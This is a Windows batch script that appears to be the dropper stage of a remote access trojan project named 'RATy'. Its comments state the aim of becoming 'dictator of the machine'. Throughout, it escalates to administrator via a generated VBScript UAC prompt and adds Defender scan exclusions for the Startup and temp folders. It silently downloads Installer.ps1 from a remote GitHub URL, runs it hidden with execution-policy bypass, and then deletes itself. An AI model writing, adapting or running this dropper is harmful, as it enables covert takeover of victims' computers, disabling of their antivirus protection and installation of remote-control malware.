@REM takes permission from user to run everything as ADMIN (UAC - User Access Control)
@REM and downloads and runs 'installer.ps1' from 'STARTUP' directory and once
@REM 'installer.ps1' has run and completed its operations, control comes back to
@REM 'wget.cmd' and at that point it(wget.cmd) deletes itself from the pc/startup directory

@REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@REM getting admin permissions for script (A prompt will occur from windows side, asking if we want to allow to run the program as an administrator)
@REM @echo off
:: BatchGotAdmin
:-------------------------------------
@REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

@REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
@REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


@REM Now After getting the admin privillages we would like to be kinda
@REM dictator of the machine, for this we need to run "ep bypass(executionpolicy bypass)"
@REM which can be a red flag for AVs so we will try to disable them first before running
@REM 'ep bypass' so that they dont mess around and flag/false-flag anything
    @REM => We are disabling Window Defender and AV in 'Installer.ps1'

@REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
set "STARTUPdir="

@REM Dynamically retrieving Startup folder path from the windows registry (we are retrieving from win registry as the user may had change the name of the StartUp Folder on his PC, So harcoding anything wont work)
for /f "tokens=2,*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Startup 2^>nul') do set "STARTUPdir=%%B"
if not defined STARTUPdir (
    echo ERROR: Could not retrieve Startup folder path.
    exit /b
)
@REM @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


@REM RATy resources
powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://raw.githubusercontent.com/mohid-mughal/RATy/refs/heads/main/files/Installer.ps1' -OutFile 'installer.ps1' "; Add-MpPreference-ExclusionPath "%STARTUPdir%"; Add-MpPreference-ExclusionPath "$env:temp";  & @REM attempt to exclude STARTUP and TEMP directory from being scanned by AVs
powershell powershell.exe -windowstyle hidden -ep bypass .\installer.ps1 & @REM Execution Policy Bypass

pause

@REM SELF DELETE
del wget.cmd